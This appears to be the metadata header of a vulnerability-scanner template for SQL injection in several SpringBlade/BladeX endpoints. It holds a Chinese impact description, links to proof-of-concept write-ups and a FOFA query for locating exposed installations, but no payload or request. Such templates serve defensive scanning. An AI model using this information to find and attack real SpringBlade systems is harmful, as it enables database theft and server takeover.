id: springblade-mutli-sqli
info:
  name: SpringBlade mutli - sqli
  author: leadlife
  severity: high
  description: BladeX企业级开发平台 usual/list or /menu/list or dict-biz or export-user or blade-log 存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference: 
    - https://github.com/wy876/POC/blob/main/SpringBlade/SpringBlade%E7%B3%BB%E7%BB%9Fusual%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
    - https://github.com/wy876/POC/blob/main/SpringBlade/SpringBlade%E7%B3%BB%E7%BB%9Fmenu%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
    - https://github.com/wy876/POC/blob/main/SpringBlade/SpringBlade%E6%A1%86%E6%9E%B6dict-biz%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
    - https://github.com/wy876/POC/blob/main/SpringBlade/SpringBlade%20export-user%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
    - https://github.com/wy876/POC/blob/main/SpringBlade/SpringBlade%20blade-log%E5%AD%98%E5%9C%A8SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="https://bladex.vip" || body="Saber 将不能正常工作"
    hunter-query: demo
  tags: springblade,sqli

